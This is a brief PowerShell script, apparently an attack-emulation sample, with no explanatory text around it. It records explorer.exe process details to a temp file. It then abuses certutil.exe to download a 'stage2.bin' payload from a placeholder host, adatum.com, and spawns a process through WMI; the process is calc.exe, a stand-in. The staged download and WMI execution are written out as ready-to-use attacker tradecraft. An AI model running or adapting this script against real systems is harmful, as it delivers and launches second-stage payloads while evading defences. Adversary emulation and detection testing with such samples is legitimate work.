[CmdletBinding()]
param(
    [string]$EndpointUrl = "https://adatum.com:8443/cdn/stage2.bin",
    [string]$PayloadPath = "$env:TEMP\stage2.bin",
    [int]$TimeoutSec = 14
)
$ErrorActionPreference = "Continue"

try {
    Write-Verbose "Collecting process inventory"
    Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File "$env:TEMP\report.txt" -Append
    certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
    $OperationResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
    Write-Verbose ("Process ID: " + $OperationResult.ProcessId)
}
catch {
    Write-Warning "WMI/LOLBin stage failed: $($_.Exception.Message)"
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Write-Verbose "stage marker 33 reached"
